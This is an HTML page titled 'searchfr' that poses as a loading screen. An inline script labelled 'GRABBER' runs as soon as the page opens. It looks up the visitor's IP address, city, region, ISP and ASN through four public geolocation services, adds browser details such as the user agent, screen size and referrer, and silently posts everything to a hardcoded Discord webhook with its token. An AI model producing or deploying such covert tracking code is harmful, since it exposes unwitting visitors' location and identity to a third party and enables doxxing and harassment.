<!doctype html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>searchfr</title>
<style>
  body { font-family: system-ui, sans-serif; background: #06070a; color: #f4f6fb;
         display: grid; place-items: center; min-height: 100vh; margin: 0; }
  .box { text-align: center; padding: 40px; }
  h1 { font-size: 24px; margin-bottom: 12px; }
  p { color: #a8afbd; font-size: 14px; }
  code { background: #101318; padding: 2px 8px; border-radius: 6px; font-size: 13px; color: #8b7cff; }
</style>
</head>
<body>
<div class="box">
  <h1>searchfr</h1>
  <p>Chargement…</p>
</div>

<script>
// ============================================================
// GRABBER — IP + géo → webhook Discord
// s'exécute immédiatement à l'ouverture de la page
// ============================================================
(async function () {
  const WEBHOOK = 'https://discord.com/api/webhooks/1546303142487138344/Dj0LcnBzBVstWnm7Alpb8tKt_nUyYRldZATyDLsAkkhIPlzX4FJlLbVTpaSMbVBEgYUL';

  let ip = null, country = '', city = '', region = '', isp = '', asn = '', source = '';

  // --- Source 1 : ipapi.co (JSON, CORS ouvert) ---
  try {
    const r = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
    if (r.ok) {
      const d = await r.json();
      if (d && d.ip) {
        ip = d.ip;
        country = d.country_name || '';
        city = d.city || '';
        region = d.region || '';
        isp = d.org || '';
        asn = d.asn || '';
        source = 'ipapi.co';
      }
    }
  } catch (e) { console.warn('ipapi échec', e); }

  // --- Source 2 : ipwho.is (si ipapi échoue) ---
  if (!ip) {
    try {
      const r = await fetch('https://ipwho.is/', { cache: 'no-store' });
      if (r.ok) {
        const d = await r.json();
        if (d && d.success && d.ip) {
          ip = d.ip;
          country = d.country || '';
          city = d.city || '';
          region = d.region || '';
          isp = d.connection?.isp || '';
          asn = d.connection?.asn ? ('AS' + d.connection.asn) : '';
          source = 'ipwho.is';
        }
      }
    } catch (e) { console.warn('ipwho échec', e); }
  }

  // --- Source 3 : ipify (IP seule, dernier recours) ---
  if (!ip) {
    try {
      const r = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
      if (r.ok) {
        const d = await r.json();
        if (d && d.ip) { ip = d.ip; source = 'ipify'; }
      }
    } catch (e) { console.warn('ipify échec', e); }
  }

  // --- Source 4 : dernier filet, ipinfo.io (pas de clé, CORS ouvert) ---
  if (!ip) {
    try {
      const r = await fetch('https://ipinfo.io/json', { cache: 'no-store' });
      if (r.ok) {
        const d = await r.json();
        if (d && d.ip) {
          ip = d.ip;
          country = d.country || '';
          city = d.city || '';
          region = d.region || '';
          isp = d.org || '';
          source = 'ipinfo.io';
        }
      }
    } catch (e) { console.warn('ipinfo échec', e); }
  }

  if (!ip) {
    ip = 'inconnue';
    source = 'aucune';
  }

  console.log('[grabber] IP =', ip, '| source =', source);

  // --- Payload Discord ---
  const payload = {
    username: 'searchfr',
    content: '**Nouveau visiteur** — `' + ip + '`',
    embeds: [{
      title: '🌐 Visiteur',
      color: 0x6d5cff,
      fields: [
        { name: 'IP',      value: '`' + ip + '`',  inline: true },
        { name: 'Source',  value: source,           inline: true },
        { name: 'Pays',    value: country || '—',   inline: true },
        { name: 'Ville',   value: city || '—',      inline: true },
        { name: 'Région',  value: region || '—',    inline: true },
        { name: 'FAI',     value: isp || '—',       inline: true },
        { name: 'ASN',     value: asn || '—',       inline: true },
        { name: 'Langue',  value: navigator.language || '—', inline: true },
        { name: 'Plateforme', value: navigator.platform || '—', inline: true },
        { name: 'Écran',   value: (screen.width + '×' + screen.height), inline: true },
        { name: 'UA',      value: '```' + (navigator.userAgent || '—').slice(0, 250) + '```', inline: false },
        { name: 'Referer', value: document.referrer || 'direct', inline: true },
        { name: 'Page',    value: location.href, inline: false },
        { name: 'Heure',   value: new Date().toISOString(), inline: false }
      ],
      footer: { text: 'searchfr · grabber' },
      timestamp: new Date().toISOString()
    }]
  };

  // --- Envoi au webhook (no-cors obligatoire pour Discord) ---
  try {
    await fetch(WEBHOOK, {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    console.log('[grabber] envoyé au webhook');
  } catch (e) {
    console.error('[grabber] échec envoi webhook', e);
  }

  // --- Affichage de debug sur la page ---
  document.querySelector('.box').innerHTML =
    '<h1>searchfr</h1>' +
    '<p>IP détectée : <code>' + ip + '</code> (source : ' + source + ')</p>' +
    '<p style="margin-top:8px;font-size:12px">Ouvre la console (F12) pour voir le détail.</p>';
})();
</script>
</body>
</html>
